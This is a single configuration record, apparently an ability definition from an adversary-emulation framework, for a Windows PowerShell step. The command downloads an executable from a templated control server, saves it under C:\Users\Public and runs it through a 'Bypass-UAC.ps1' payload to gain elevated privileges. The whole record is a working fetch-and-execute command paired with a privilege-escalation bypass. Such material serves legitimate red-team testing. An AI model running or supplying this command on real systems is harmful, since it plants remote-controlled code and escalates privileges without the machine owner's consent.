{'name': 'psh', 'platform': 'windows', 'command': '$url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command "C:\\Users\\Public\\$name.exe -group #{group}"; };\nReceive-Job -Job $job -Wait;', 'code': None, 'language': None, 'build_target': None, 'payloads': ['Bypass-UAC.ps1'], 'uploads': [], 'timeout': 60, 'parsers': [], 'cleanup': [], 'variations': [], 'additional_info': {}}
